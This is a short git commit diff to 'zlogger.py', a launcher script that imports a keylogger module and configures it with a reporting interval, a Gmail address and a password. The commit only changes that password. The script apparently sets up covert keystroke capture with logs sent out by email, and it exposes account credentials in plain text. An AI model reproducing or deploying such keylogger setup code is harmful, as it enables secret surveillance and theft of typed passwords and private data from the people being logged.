b9452a1c5f74a4a007b114384949a96a00e3badf
mkalifae <42450416+mkalifae@users.noreply.github.com>
2021-08-24 11:31:03 -0500

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, "johnwickend29@gmail.com", "abc123abc1234")
+my_keylogger = keylogger.Keylogger(120, "johnwickend29@gmail.com", "abc123abc")
 # my_keylogger.start()
